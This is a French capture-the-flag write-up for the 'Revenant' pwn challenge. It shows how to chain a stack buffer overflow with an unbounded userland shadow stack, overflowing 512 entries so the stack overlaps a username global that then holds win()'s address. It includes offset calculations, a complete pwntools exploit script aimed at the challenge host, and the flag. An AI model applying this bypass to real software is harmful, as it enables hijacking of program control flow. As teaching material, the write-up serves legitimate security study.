# Midnight Flag 2026 - Pwn - Revenant

- **Catégorie :** Pwn

- **Description :** Something watches over you in this place. Every step, every decision — recorded, verified. It knows where you've been. It knows where you're going. It cannot be fooled. ...probably. [`Revenant.zip`](Revenant.zip)

- **Résumé de la chaîne d'attaque :** Stack Buffer Overflow & Shadow Stack Bypass via Pointer Overflow.

## Reconnaissance

`unzip -l Revenant.zip`

```bash
    Length      Date    Time    Name
    0  2026-03-13 07:57   pub/
  114  2026-03-13 06:11   pub/docker-compose.yml
    0  2026-03-13 06:11   pub/sources/
 2395  2026-03-13 06:11   pub/sources/shadow_stack.c
 2189  2026-03-13 06:11   pub/sources/game.c
  428  2026-03-13 06:11   pub/sources/shadow_stack.h
  201  2026-03-13 06:11   pub/sources/Makefile
  435  2026-03-13 07:57   pub/Dockerfile
21216  2026-03-13 06:11   pub/shadow_stack.o
17144  2026-03-13 06:11   pub/game
44122                     10 files
```

Le fichier principal est `game.c`, on trouve deux vulnérabilités :

1. Buffer Overflow dans la fonction `play()`

```c
void play(void) {
    shadow_stack_push((uintptr_t)__builtin_return_address(0));
    char buf[32]; // Buffer de 32 octets
    ...
    read(0, buf, 128); // Lecture de 128 octets -> Overflow
    ...
    if (!shadow_stack_pop((uintptr_t)__builtin_return_address(0))) {
        puts("  [!] Something is wrong with your memory...");
        _exit(1);
    }
}
```

2. La Shadow Stack (Mécanisme de protection)

Pour empêcher le Buffer Overflow, le programme utilise une Shadow Stack ([page Wikipedia](https://en.wikipedia.org/wiki/Shadow_stack)). C’est comme une deuxième pile cachée qui note l'adresse de retour au début de la fonction, et qui vérifie si elle est toujours la même à la fin. Si on a écrasé la mémoire, la Shadow Stack voit que ça ne correspond plus et bloque tout.

La faille est que Le programme range ces adresses dans un tableau de 512 cases. Mais il oublie de vérifier si on dépasse ces 512 cases. En faisant 512 resets (récursions), on force le curseur de cette pile à sortir du tableau.

En modifiant ensuite notre nom d'utilisateur avec l'adresse de `win()`, on remplace l'adresse de retour sauvegardée dans la Shadow Stack. Lors de la vérification finale, le programme compare notre Buffer Overflow (la pile réelle) avec notre username (la Shadow Stack empoisonnée) : les deux valeurs correspondent, et le programme saute vers la fonction `win()`.




## Exploitation

### 1. Trouver l'adresse de `win()`

À l'aide de la commande `nm`, on identifie l'adresse de la fonction cible

```bash
nm game | grep win
# 00000000004012d6 T win (0x4012d6)
```

### 2. Contourner la Shadow Stack

Comme il y a une absence de vérification des bornes de la Shadow Stack. Elle est définie comme un tableau de 512 entrées de 8 octets. Grâce à `nm`, on observe la disposition de la mémoire (.bss) :

- `shadow_stack` : `0x406000`

- `username` : `0x407000`

Calcul d'offset : `(0x407000 - 0x406000) / 8 = 512`.
La 513ème entrée (index 512) de la Shadow Stack se superpose exactement avec la variable globale `username`.

### 3. Empoisonnement du pointeur

En utilisant l'option `[4] Die and restart`, le programme appelle `play()` de manière récursive.

1. On effectue 511 resets.

2. Au 512ème appel, le pointeur de la Shadow Stack pointe sur username.

2. On utilise l'option `[3] Change callsign` pour écrire l'adresse de `win()` dans username.

4. Désormais, la Shadow Stack "croit" que l'adresse de retour légitime est `win()`.

###  4. Déclenchement du Buffer Overflow
L'analyse de l'assembleur de la fonction `play()` permet de déterminer la distance entre le début du buffer et l'adresse de retour. L'instruction suivante est : `lea -0x30(%rbp), %rax`

Elle indique que le buffer commence à l'adresse `$rbp - 0x30`. Le calcul du padding est : `48 octets (buffer 0x30) + 8 octets (RBP) = 56 octets`

### 5. Script d'Exploitation

```python
from pwn import *

context.log_level = 'error'
win_addr = p64(0x4012d6)

p = remote('dyn-01.midnightflag.fr', 13711)

p.sendlineafter(b'Survivor name:\n', b'test')

for i in range(512):
    p.recvuntil(b'> ')
    p.sendline(b'4')
    p.recvuntil(b'Survivor name:\n')
    p.sendline(b'test')
    if i % 50 == 0:
        print(f"reset {i}/512")

print("512 resets ok !")

p.recvuntil(b'> ')
p.sendline(b'3')
# pas de recvuntil ici, on envoie directement
import time
time.sleep(0.5)
p.send(win_addr)
print("win() ecrit !")

p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'(0-255):\n')
p.send(b'A' * 56 + win_addr)
print("BOF envoye !")

p.recvuntil(b'> ')
p.sendline(b'0')

p.interactive()
```

## Flag

```text
MCTF{Wh4t_w4s_th4t_1d3a_t0_Cr3ate_a_userl4nd_sh4dow_st4ck??}
```